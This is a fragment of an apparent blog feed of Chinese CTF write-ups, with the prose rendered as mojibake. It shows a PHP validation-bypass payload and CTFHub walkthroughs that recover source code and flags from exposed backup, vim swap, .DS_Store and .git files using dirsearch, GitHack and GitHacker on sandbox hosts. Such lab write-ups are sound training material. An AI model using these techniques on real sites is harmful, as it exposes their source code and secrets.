class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login&quot;</span>]))  <br>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>]))<br>  &#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;[a-zA-Z0-9]&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>    &#123;<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;give you flag)&quot;)&lt;/script&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">elseif</span> (strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>]) &lt; <span class="hljs-number">10</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>] &gt; <span class="hljs-number">987654321</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>], <span class="hljs-string">&#x27;#BIG#&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>      &#123;<br>        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./flag.php&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Congratulations! FLAG is : &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);<br>      &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);<br>    &#125;<br>  &#125;<br>&#125;<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼š</p><p>1.issetå‡½æ•°ï¼ŒPOSTä¼ å…¥å‚æ•°loginå’Œyingziã€‚<br>2.strlenå‡½æ•°ï¼Œå‚æ•°yingziçš„å€¼é•¿åº¦å°äº10ï¼Œä¸”æ•°å€¼å¤§äº987654321ã€‚<br>3.strposå‡½æ•°ï¼Œå‚æ•°yingziçš„å€¼æ˜¯å¦åŒ¹é…<code>#BIG#</code>ï¼Œå¦‚æœæœ‰ï¼Œåˆ™åŒ…å«ä¸€ä¸ªflag.phpæ–‡ä»¶ï¼Œè¾“å‡ºflagã€‚</p><p>ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡strlenå‡½æ•°ï¼Œä»¤yingzi=e9ï¼Œæ­¤æ—¶strlen=3ï¼Œä¸ºäº†åŒ¹é…<code>#BIG#</code>ï¼Œæ‰€ä»¥yingzi=1e9#BIG#</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: login=<span class="hljs-number">1</span>&amp;yingzi=<span class="hljs-number">1e9</span><span class="hljs-comment">#BIG#</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210201120107109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-ä¿¡æ¯æ³„éœ²ç»ƒä¹ </title>
    <link href="/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šCTFHubé¶åœºé€šå…³ï¼ˆä¸€ï¼‰</p> <a id="more"></a><h2 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h2><p>è®¿é—®ç½‘å€ï¼Œç‚¹å‡»ç»¿è‰²æŒ‰é’®<br><img src="https://img-blog.csdnimg.cn/20201025170908376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åå‡ºç°è¿™æ ·çš„é¡µé¢<br><img src="https://img-blog.csdnimg.cn/20201025170931536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹è¿›å»å‘ç°éƒ½æœ‰å››ä¸ªå­æ–‡ä»¶ï¼Œæ—¢ç„¶é¢˜ç›®æ˜¯ç›®å½•éå†ï¼Œé‚£æˆ‘å°±ä¸€ä¸ªä¸ªç‚¹è¿›å»çœ‹ï¼Œæœ€ååœ¨4/4ç›®å½•ä¸‹å‘ç°äº†flag.txt<br><img src="https://img-blog.csdnimg.cn/20201025171354476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰“å¼€è·å¾—flag<br><img src="https://img-blog.csdnimg.cn/20201025171411952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>è®¿é—®ç½‘å€ï¼Œç‚¹å‡»ç»¿è‰²æŒ‰é’®<br><img src="https://img-blog.csdnimg.cn/20201024125404176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°æ˜¯phpinfo.php<img src="https://img-blog.csdnimg.cn/20201024125428811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŒ‰ctrl+Fæœç´¢flag<br><img src="https://img-blog.csdnimg.cn/20201024125524903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å¤‡ä»½æ–‡ä»¶ä¸‹è½½"><a href="#å¤‡ä»½æ–‡ä»¶ä¸‹è½½" class="headerlink" title="å¤‡ä»½æ–‡ä»¶ä¸‹è½½"></a>å¤‡ä»½æ–‡ä»¶ä¸‹è½½</h2><h3 id="ç½‘ç«™æºç "><a href="#ç½‘ç«™æºç " class="headerlink" title="ç½‘ç«™æºç "></a>ç½‘ç«™æºç </h3><p>è®¿é—®ç½‘å€<br><img src="https://img-blog.csdnimg.cn/20201025171840554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨ dirsearchæ‰«æï¼Œå‘ç°äº†å¯ç–‘æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">py dirsearch.py -u http://challenge-4f306ca5f548ac6b.sandbox.ctfhub.com:<span class="hljs-number">10080</span>/ -e*<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201025172527172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¿é—®è¯¥æ–‡ä»¶ï¼Œè‡ªåŠ¨ä¸‹è½½äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹çœ‹åˆ°flagæ–‡æ¡£ï¼Œç»“æœã€‚ã€‚ã€‚ã€‚ã€‚ã€‚<br><img src="https://img-blog.csdnimg.cn/20201025172829492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥åœ¨æµè§ˆå™¨ä¸Šè®¿é—®flagæ–‡æ¡£<br><img src="https://img-blog.csdnimg.cn/20201025173027426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="bakæ–‡ä»¶"><a href="#bakæ–‡ä»¶" class="headerlink" title="bakæ–‡ä»¶"></a>bakæ–‡ä»¶</h3><p><img src="https://img-blog.csdnimg.cn/20201025173722285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸€èˆ¬å¤‡ä»½æ–‡ä»¶çš„æ ¼å¼åç¼€ä¸º<code>.bak</code>ï¼Œå› æ­¤è®¿é—®<code>url+/index.php.bak</code>ï¼Œä¼šè‡ªåŠ¨ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€è¯¥æ–‡ä»¶ï¼Œå³å¯å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20201025173839200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> <em>å¸¸è§å¤‡ä»½æ–‡ä»¶çš„åç¼€</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">.rar<br>.<span class="hljs-built_in">zip</span><br><span class="hljs-number">.7</span>z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html<br>linuxä¸­å¯èƒ½ä»¥<span class="hljs-string">&quot; ~ &quot;</span> ç»“å°¾<br></code></pre></td></tr></table></figure><h3 id="vimç¼“å­˜"><a href="#vimç¼“å­˜" class="headerlink" title="vimç¼“å­˜"></a>vimç¼“å­˜</h3><p>é¢˜ç›®æè¿°ï¼šå½“å¼€å‘äººå‘˜åœ¨çº¿ä¸Šç¯å¢ƒä¸­ä½¿ç”¨ vim ç¼–è¾‘å™¨ï¼Œåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ä¼šç•™ä¸‹ vim ç¼–è¾‘å™¨ç¼“å­˜ï¼Œå½“vimå¼‚å¸¸é€€å‡ºæ—¶ï¼Œç¼“å­˜ä¼šä¸€ç›´ç•™åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¼•èµ·ç½‘ç«™æºç æ³„éœ²ã€‚<br><img src="https://img-blog.csdnimg.cn/20201025175348418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç™¾åº¦äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯ <code>vimç¼“å­˜</code></p><blockquote><p>vimåœ¨ç¼–è¾‘æ–‡æ¡£çš„è¿‡ç¨‹ä¸­å¦‚æœå¼‚å¸¸é€€å‡ºï¼Œä¼šäº§ç”Ÿç¼“å­˜æ–‡ä»¶ï¼Œç¬¬ä¸€æ¬¡äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶åç¼€ä¸º.swpï¼Œåé¢ä¼šäº§ç”Ÿswoç­‰.<br>ç½‘é¡µåé¢è¾“å…¥.index.php.swpæ‰èƒ½è·å–åˆ°index.phpçš„å¤‡ä»½æ–‡ä»¶</p></blockquote><p>è®¿é—®<code>url/+.index.php.swp</code>ä¸‹è½½æ–‡ä»¶ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œåœ¨æ–‡æ¡£åº•éƒ¨æ‰¾åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20201025175508624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><p>é¢˜ç›®æè¿°ï¼š<br>DS_Store æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</p><p>è®¿é—®é¢˜ç›®åœ°å€<br><img src="https://img-blog.csdnimg.cn/20201118202642955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥è®¿é—®<code>.DS_Store</code>æ–‡ä»¶ï¼Œè‡ªåŠ¨ä¸‹è½½æ–‡ä»¶ï¼Œåœ¨kaliä¸­ä½¿ç”¨å‘½ä»¤<code>cat DS_Store</code><br><img src="https://img-blog.csdnimg.cn/20201118203036832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¿é—®d18ec35f05a6922cc5c842f7b6706243.txtæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/20201118203317871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Gitæ³„éœ²"><a href="#Gitæ³„éœ²" class="headerlink" title="Gitæ³„éœ²"></a>Gitæ³„éœ²</h2><p><strong>å®‰è£… Git</strong></p><p>1 .ç‚¹å‡»Git-2.18.0-32-bit.exeè¿›è¡Œå®‰è£…ï¼Œé€‰æ‹©å®‰è£…è·¯å¾„ã€‚<br><img src="https://img-blog.csdnimg.cn/20201024183656934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3doYXQ=,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>2 . ç‚¹å‡»â€œNextâ€æŒ‰é’®<br><img src="https://img-blog.csdnimg.cn/20201024183722145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>3 .Nextï¼Œåœ¨å¯åŠ¨æ–‡ä»¶å¤¹é¡µé¢ä¸­ï¼Œé»˜è®¤å³å¯ã€‚<br><img src="https://img-blog.csdnimg.cn/20201024183744151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>4 .Nextï¼Œåœ¨ä¸º Git é€‰æ‹©é»˜è®¤ç¼–è¾‘å™¨çš„é¡µé¢ä¸­ï¼Œå¯ä»¥é€‰æ‹©ä¸€ä¸ªåœ¨ Windowsç³»ç»Ÿä¸­ä½¿ç”¨è¾ƒä¸ºæ–¹ä¾¿çš„ç¼–è¾‘å™¨ã€‚</p><p>5 .Nextï¼Œåœ¨å°† Git æ·»åŠ åˆ°ç¯å¢ƒå˜é‡çš„é¡µé¢ä¸­ï¼Œé€‰æ‹©ç¬¬äºŒé¡¹ã€‚å¯ä»¥å°† Git è‡ªåŠ¨æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥æ–¹ä¾¿åœ°ä½¿ç”¨ Windows æ§åˆ¶å°æ‰§è¡Œ Git ç›¸å…³çš„å‘½ä»¤ã€‚<br><img src="https://img-blog.csdnimg.cn/20201024183816454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>6 .åé¢çš„é¡µé¢ä¸€è·¯nextï¼Œå°±å¯ä»¥å®Œæˆ Gitçš„å®‰è£…ã€‚</p><p><strong>åˆå§‹åŒ– Git</strong></p><blockquote><p>æ³¨æ„ï¼šåœ¨é…ç½® Git ç”¨æˆ·åå’Œé‚®ç®±æ—¶ï¼Œæ¨èä½¿ç”¨åœ¨ CodeCode æ³¨å†Œçš„ç”¨æˆ·åå’Œé‚®ç®±ã€‚</p></blockquote><p>1  . åœ¨ Git ä¸­é…ç½® CodeCode ç”¨æˆ·åã€‚<br>æ‰“å¼€cmdï¼Œè¾“å…¥å‘½ä»¤ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">git config --global user.name <span class="hljs-string">&#x27;xxx&#x27;</span><br></code></pre></td></tr></table></figure><p>2 . åœ¨ Git ä¸­é…ç½®é‚®ç®±ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">git config --global user.email <span class="hljs-string">&#x27;xxx@qq.com&#x27;</span><br></code></pre></td></tr></table></figure><p>3 . æŸ¥çœ‹å·²é…ç½®çš„ç”¨æˆ·ä¿¡æ¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">git config --<span class="hljs-keyword">global</span> --<span class="hljs-built_in">list</span><br></code></pre></td></tr></table></figure><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><p> ä½¿ç”¨githackå·¥å…·å¤„ç†gitæ³„éœ²æƒ…å†µï¼Œæ‰“å¼€cmdçª—å£ï¼Œè¿›å…¥githackç›®å½•ä¸‹ï¼Œç„¶åæ‰§è¡Œ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">python2 Githack.py http:<span class="hljs-comment">//challenge-097036b10ed011a0.sandbox.ctfhub.com:10080/.git/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024204243631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿˜åŸåçš„æ–‡ä»¶åœ¨ <code>dist</code> ç›®å½•ä¸‹<br><img src="https://img-blog.csdnimg.cn/20201024204611326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åº”è¯¥æœ‰éšè—æ–‡ä»¶å¤¹ï¼Œé¼ æ ‡å³é”®æ‰“å¼€gitå‘½ä»¤çª—å£ï¼Œæ‰§è¡Œ<code>ls  -a</code>ï¼Œå‘ç°äº†éšè—æ–‡ä»¶å¤¹<code>.git</code><br><img src="https://img-blog.csdnimg.cn/20201024204803631.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶å<code> cd .git</code>è¿›å…¥.gitç›®å½•,å†æ‰§è¡Œ<code>ls -a</code>ï¼Œå‘ç°äº†<code>..æ–‡ä»¶</code><br><img src="https://img-blog.csdnimg.cn/2020102420502298.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰§è¡Œ<code>cd ..</code>ï¼Œç„¶åä½¿ç”¨<code>git log</code>å‘½ä»¤æŸ¥çœ‹å†å²è®°å½•ã€‚æœ€æ–°ç‰ˆæœ¬ ä¸ºremove flagï¼Œflag åœ¨ add flagä¸­<br> <img src="https://img-blog.csdnimg.cn/20201024205433523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›è¡Œæ¯”å¯¹ï¼Œå¾—åˆ°flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">git diff <span class="hljs-number">602e0165129</span>c86054756c8a1b188265377b1d334<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024205703823.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><p>æ‰“å¼€cmdçª—å£ï¼Œè¿›å…¥githackç›®å½•ä¸‹ï¼Œç„¶åæ‰§è¡Œ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">python2 GitHack.py http:<span class="hljs-comment">//challenge-5dbefbea477f1e4f.sandbox.ctfhub.com:10080/.git/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024234829723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥ç”Ÿæˆçš„æ–‡ä»¶å¤¹è·¯å¾„åï¼Œè¾“å…¥ï¼š <code>git stash list</code><br><img src="https://img-blog.csdnimg.cn/2020102423493374.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¾“å…¥ <code>git stash apply</code> è¿›è¡Œæ¢å¤ï¼Œå‘ç°äº†ä¸€ä¸ªæ–‡æ¡£<br><img src="https://img-blog.csdnimg.cn/20201024235041194.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨è·¯å¾„ä¸‹æ‰¾åˆ°æ–‡æ¡£ï¼Œå¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20201024235153602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>æ–¹æ³•ä¸€ï¼š<br>å’Œå‰é¢ä¸¤é¢˜ä¸€æ ·çš„æ“ä½œï¼Œè¿›å…¥githackç›®å½•ä¸‹ï¼Œç„¶åæ‰§è¡Œ<code>python2 GitHack.py http://challengefbe1da739791a37e.sandbox.ctfhub.com:10080/.git/</code><br><img src="https://img-blog.csdnimg.cn/20201025122844915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>cdåˆ°ç”Ÿæˆçš„æ–‡ä»¶å¤¹ç›®å½•ä¸‹ï¼Œæ‰§è¡Œ<code>git ls-files</code>å‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ–‡æ¡£<br><img src="https://img-blog.csdnimg.cn/20201025122827978.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>flagå°±åœ¨æ–‡æ¡£ä¸­<br><img src="https://img-blog.csdnimg.cn/20201025123137677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ–¹æ³•äºŒï¼š<br>kaliä¸­ä½¿ç”¨GitHackerï¼Œæ‰§è¡Œå‘½ä»¤å®‰è£…GitHacker</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">clone git clone https:<span class="hljs-comment">//github.com/WangYihang/GitHacker</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥GitHackerç›®å½•ä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">python3 GitHacker.py http:<span class="hljs-comment">//challenge-78aecaffb772da05.sandbox.ctfhub.com:10080/.git</span><br></code></pre></td></tr></table></figure><p><img 